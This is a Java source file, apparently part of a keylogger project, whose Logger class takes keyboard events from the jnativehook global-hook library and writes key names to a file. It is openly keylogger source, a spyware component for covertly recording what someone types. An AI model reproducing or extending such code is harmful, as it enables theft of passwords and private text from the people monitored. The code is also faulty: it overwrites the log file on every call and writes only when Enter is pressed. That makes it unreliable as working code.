package keylogger;
import java.awt.event.KeyEvent;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Logger {
	String currentKey;
	String previousKey;
	String path;
	FileOutputStream out;
	
	
	public Logger(String path) {
		this.path = path;
	}
	
	private void closure() {
		try {
			out.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	
	public boolean write(byte[] data) {
		try {
			out.write(data);
			return true;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return false;
	}
	
	
	public boolean log(NativeKeyEvent e) {
		try {
		
		out = new FileOutputStream(path);
		byte[] data = KeyEvent.getKeyText(e.getKeyCode()).getBytes();
	
		if(e.getKeyCode() == KeyEvent.VK_ENTER)
			return write(data);
		
		}catch(FileNotFoundException e1) {
			e1.printStackTrace();
		}finally {
			closure();
		}
		return false;
	}
}
